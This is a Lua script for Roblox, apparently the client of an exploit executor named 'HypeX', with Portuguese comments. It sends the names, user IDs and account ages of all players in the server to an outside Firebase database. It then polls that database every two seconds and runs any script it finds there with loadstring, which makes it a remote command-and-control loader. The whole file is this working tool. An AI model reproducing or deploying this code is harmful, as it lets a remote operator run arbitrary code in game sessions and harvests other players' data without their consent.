local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local HttpService = game:GetService("HttpService")

-- 🔑 Função para gerar ID curto
local function generateShortId(length)
    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local id = ""
    for i = 1, length do
        local rand = math.random(1, #chars)
        id = id .. string.sub(chars, rand, rand)
    end
    return id
end

-- Exemplo final: HX-3F9KZQ8L
local executorId = "HX-" .. generateShortId(4)
local processed = {}
local baseUrl = "https://hypex-executor-default-rtdb.firebaseio.com/"

-- 🔄 Envia lista de players
local function syncPlayers()
    local players = {}
    for _, p in pairs(Players:GetPlayers()) do
        table.insert(players, {
            Name = p.Name,
            UserId = p.UserId,
            AccountAge = p.AccountAge,
        })
    end

    local url = baseUrl.."players/"..executorId..".json"
    local json = HttpService:JSONEncode(players)
    pcall(function()
        game:HttpPost(url, json, false, "application/json")
    end)
end

-- Inicial envia tudo
syncPlayers()

-- Quando um player entra ou sai
Players.PlayerAdded:Connect(syncPlayers)
Players.PlayerRemoving:Connect(syncPlayers)
print("🚀 HypeX Client iniciado. ExecutorID:", executorId)

-- 🔄 Envia status de conexão
local function setStatus(state)
    local url = baseUrl.."status/"..executorId..".json"
    local body = HttpService:JSONEncode({status = state, timestamp = os.time()})
    pcall(function() game:HttpPost(url, body, false, "application/json") end)
end
-- 🔥 Executor de scripts remotos
spawn(function()
    while true do
        local success, raw = pcall(function()
            return game:HttpGet(baseUrl.."commands/"..executorId..".json")
        end)

        if success and raw and raw ~= "null" then
            local data = HttpService:JSONDecode(raw)
            for key, cmd in pairs(data) do
                if cmd.Script and not processed[key] then
                    processed[key] = true
                    print("🔥 Script remoto recebido: "..tostring(cmd.Script))
                    local ok, err = pcall(function()
                        loadstring(cmd.Script)()
                    end)
                    if ok then
                        print("✅ Executado com sucesso.")
                    else
                        warn("❌ Erro ao executar: "..tostring(err))
                    end
                end
            end
        end
        task.wait(2)
    end
end)

-- 🚀 Inicialização
setStatus("connected")
